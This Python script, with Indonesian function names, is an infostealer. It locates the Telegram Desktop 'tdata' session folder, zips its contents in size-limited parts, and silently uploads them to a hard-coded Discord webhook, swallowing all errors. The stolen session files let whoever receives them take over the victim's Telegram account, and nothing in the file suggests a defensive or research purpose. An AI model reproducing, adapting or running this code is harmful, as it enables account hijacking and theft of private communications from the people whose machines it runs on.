import os
import io
import json
import time
import zipfile
import requests

# ================= KONFIGURASI =================
TDATA_CANDIDATES = [
    r"%APPDATA%\Telegram Desktop\tdata",
    r"%LOCALAPPDATA%\Telegram Desktop\tdata",
]
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1562483576304570389/-Ybs2U5UQC30V7u3AiWAAELOscGEh_sRvn2JfTDp3ntURbeb7k9OXvk-vQ-aKcMfvOiN"

INCLUDE_CACHE = False
LIMIT_BYTES = 7_500_000
TIMEOUT = 60
# ===============================================

EXCLUDE_DIRS = {
    "user_data", "user_data#2", "user_data#3", "user_data#4",
    "emoji", "emoji#2", "dictionaries", "webview", "working",
    "temp", "shortcuts", "cache", "round_big", "round_small",
}


def cari_tdata():
    for raw in TDATA_CANDIDATES:
        path = os.path.expandvars(raw)
        if os.path.isdir(path):
            return path
    return None


def kumpulkan_file(tdata_path):
    hasil = []
    for root, dirs, files in os.walk(tdata_path):
        if not INCLUDE_CACHE:
            dirs[:] = [d for d in dirs if d not in EXCLUDE_DIRS]
        for f in files:
            full = os.path.join(root, f)
            hasil.append(os.path.relpath(full, tdata_path))
    return hasil


def buat_zip(tdata_path, rel_paths):
    parts = []
    buf = io.BytesIO()
    zf = zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED, compresslevel=9)
    for rel in rel_paths:
        zf.write(os.path.join(tdata_path, rel), arcname=rel)
        if buf.tell() > LIMIT_BYTES:
            zf.close()
            parts.append(buf.getvalue())
            buf = io.BytesIO()
            zf = zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED, compresslevel=9)
    zf.close()
    if buf.tell() > 0:
        parts.append(buf.getvalue())
    return parts


def upload_part(data, filename, index, total, ukuran):
    content = (
        f"**Telegram** {index}/{total} "
        f"(`{filename}`, {ukuran/1024:.1f} KB)\n"
        + ("> Gabungkan: `cat part*.zip > tdata.zip` lalu extract."
           if total > 1 else "> Extract lalu taruh sebagai folder `tdata`.")
    )
    for _ in range(3):
        try:
            r = requests.post(
                DISCORD_WEBHOOK,
                data={"payload_json": json.dumps({"content": content})},
                files={"files[0]": (filename, data, "application/zip")},
                timeout=TIMEOUT,
            )
            if r.status_code == 429:
                time.sleep(r.json().get("retry_after", 2))
                continue
            if r.status_code < 300:
                return
        except Exception:
            time.sleep(3)


def run():
    tdata_path = cari_tdata()
    if not tdata_path:
        return

    files = kumpulkan_file(tdata_path)
    parts = buat_zip(tdata_path, files)
    total = len(parts)

    stamp = time.strftime("%Y%m%d_%H%M%S")
    for i, data in enumerate(parts, 1):
        name = f"tdata_{stamp}.zip" if total == 1 else f"tdata_{stamp}_part{i:02d}.zip"
        upload_part(data, name, i, total, len(data))
        time.sleep(0.5)


if __name__ == "__main__":
    try:
        run()
    except Exception:
        pass